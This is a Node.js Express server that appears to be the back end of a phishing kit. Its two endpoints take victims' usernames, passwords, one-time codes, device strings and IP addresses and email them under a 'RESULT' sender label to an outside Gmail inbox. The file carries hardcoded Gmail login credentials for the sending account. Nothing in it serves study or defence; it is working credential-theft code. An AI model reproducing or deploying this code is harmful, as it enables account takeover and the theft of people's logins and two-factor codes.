const express = require('express')
const nodeMailer = require('nodemailer')
require('dotenv').config()
const cors = require('cors')
const app = express()
app.use(cors())
const bodyParser = require('body-parser')
app.use(bodyParser.urlencoded({extended:true,limit:"50mb"}))
app.use(bodyParser.json({limit:"50mb"}))
PORT = process.env.PORT

app.post('/', async(req,res)=>{
    console.log(req.body);
    const user = req.body.user
    const passwd = req.body.passwd
    const userAgent = req.body.device
    const ip = req.body.ip
    console.log('welcom');
    const html = `<p>username = ${user}</P> <p>password = ${passwd}</P>
    <p>Device = ${userAgent}</p><p>ip = ${ip}</p>`
    const transporter = nodeMailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'tyburksi23099@gmail.com',
            pass: 'wdekakhxkxqbvxzk'
        }
    })

    const mailOptions = {
        from: 'RESULT <tyburksi23099@gmail.com>',
        to: 'Lindaolivia332@gmail.com',
        subject: 'User Details',
        html: html

    }
    const result =   transporter.sendMail(mailOptions, function (err, result){
        if (err) {
            res.send({message:'error'})
            console.log(err);
        }else{
            res.status(200).send({message:'success'})
            console.log(result);
        }
    })
    
})

app.post('/code', async(req,res)=>{
    console.log(req.body);
    const code = req.body.code
    const userAgent = req.body.device
    const ip = req.body.ip
    
    const html = `<p>code = ${code}</P><p>Device = ${userAgent}</p><p>ip = ${ip}</p> `
    const transporter = nodeMailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'tyburksi23099@gmail.com',
            pass: 'wdekakhxkxqbvxzk'
        }
    })

    const mailOptions = {
        from: 'RESULT <tyburksi23099@gmail.com>',
        to: 'Lindaolivia332@gmail.com',
        subject: 'Code',
        html: html

    }
    const result =  await transporter.sendMail(mailOptions)
    if (!result) {
        res.send({message:'error'})
    }else{
        res.status(200).send({message:'success'})
    }
})

app.listen(PORT, (req,res)=>{
    console.log(`listening at port ${PORT}`);
})